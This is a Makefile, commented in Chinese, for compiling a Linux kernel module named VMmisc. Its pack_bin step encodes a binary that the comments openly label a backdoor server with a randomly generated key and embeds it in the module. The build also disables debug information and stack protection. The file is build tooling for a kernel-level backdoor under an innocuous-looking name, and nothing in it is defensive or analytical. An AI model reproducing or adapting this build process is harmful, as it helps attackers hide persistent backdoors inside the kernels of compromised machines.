# Linux内核模块编译Makefile
# 用于编译VMmisc内核模块
# 支持多种内核版本的兼容性编译

# 编译标志设置
# -g0: 关闭调试信息
# -ggdb0: 关闭GDB调试信息  
# -O2: 优化级别2
# -std=gnu89: 使用GNU C89标准
# -fno-stack-protector: 关闭栈保护
# -Wno-unused-*: 忽略未使用变量/参数/函数/标签的警告
EXTRA_CFLAGS	:= -g0 -ggdb0 -O2 -std=gnu89 -fno-stack-protector -Wno-unused-variable -Wno-unused-parameter -Wno-unused-function -Wno-unused-label 

# 其他编译选项（已注释）
# export CFLAGS := -std=gnu99 -Wall -Werror -pedantic
# ccflags-y := -DKRF_CODEGEN=1 -DLINUX -std=gnu99 -Wno-declaration-after-statement
# ccflags-y  += -I$(src)/include -Werror -fno-stack-protector -fomit-frame-pointer

# 内核源码路径
# 使用当前运行内核的源码路径
_KERNEL_PATH := /lib/modules/$(shell uname -r)/build

# 当前工作目录
PWD := $(shell pwd)

# 生成随机数用于加密
# 从/dev/urandom读取4字节并转换为十六进制
RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

# 内核对象文件目录
KO_DIR ?= $(PWD)/kofile

# 编码工具路径
ENCODE_SRC ?= $(PWD)/bin32/encode.c
ENCODE_ ?= $(PWD)/bin32/encode

# 后门二进制文件路径
DOOR_BIN ?= $(PWD)/bin32/server

# 模块名称
NAME		:= VMmisc

# 内核模块对象文件
obj-m			:= $(NAME).o

# 模块源文件
$(NAME)-y		:= kofile/main.o

# 默认目标：打包二进制文件和编译内核模块
all: pack_bin ko 
	
# 打包二进制文件目标
# 使用编码工具将后门二进制文件编码并生成file_block.inc
pack_bin:
	@ $(ENCODE_) $(DOOR_BIN) $(RAND2) > $(KO_DIR)/file_block.inc
	
# 编译内核模块目标
# 调用内核构建系统编译模块
ko:
	@ $(MAKE) -C $(_KERNEL_PATH) M=$(PWD) 

# 编码工具编译目标（已注释）
#$(ENCODE_): $(ENCODE_SRC)
#	@ echo "  CC      $(ENCODE_)"
#	@ $(CC) $(INCLUDE) -std=c99 $< -o $@
	
# 清理目标
# 删除所有编译生成的文件
clean:
	rm -f *.ko *.o *.mod.o *.mod.c *.order *~  *.symvers


